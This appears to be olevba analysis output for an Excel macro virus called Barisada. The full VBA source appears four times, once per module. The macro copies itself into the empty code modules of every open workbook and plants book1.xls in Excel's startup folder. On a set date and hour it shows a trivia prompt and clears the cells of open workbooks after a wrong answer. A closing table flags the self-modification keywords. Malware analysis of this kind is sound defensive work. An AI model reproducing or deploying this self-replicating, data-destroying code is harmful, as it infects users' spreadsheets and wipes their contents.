olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada-e5afd2096f35d13117dfcb4a89a413271df4651c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada-e5afd2096f35d13117dfcb4a89a413271df4651c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\book1.xls")
 If myfile <> "book1.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\book1.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "book1.xls" Then Workbooks("book1.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub





































































-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada-e5afd2096f35d13117dfcb4a89a413271df4651c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\book1.xls")
 If myfile <> "book1.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\book1.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "book1.xls" Then Workbooks("book1.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub





































































-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Barisada-e5afd2096f35d13117dfcb4a89a413271df4651c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\book1.xls")
 If myfile <> "book1.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\book1.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "book1.xls" Then Workbooks("book1.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub





































































-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Barisada-e5afd2096f35d13117dfcb4a89a413271df4651c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\book1.xls")
 If myfile <> "book1.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\book1.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "book1.xls" Then Workbooks("book1.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub





































































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

